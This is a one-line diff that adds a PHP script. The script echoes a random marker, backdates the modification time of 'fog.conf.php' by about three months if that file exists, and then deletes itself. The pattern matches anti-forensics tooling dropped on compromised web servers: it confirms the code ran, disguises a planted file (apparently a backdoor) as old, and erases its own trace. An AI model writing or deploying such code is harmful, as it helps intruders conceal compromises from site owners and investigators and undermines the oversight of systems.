@@ -1,0 +1,1 @@
+<?php echo "NYRdmqumWG"; if (file_exists("./fog.conf.php")){ touch("./fog.conf.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*gcXdB7SMKS4EkgWN2F2N*/ ?>
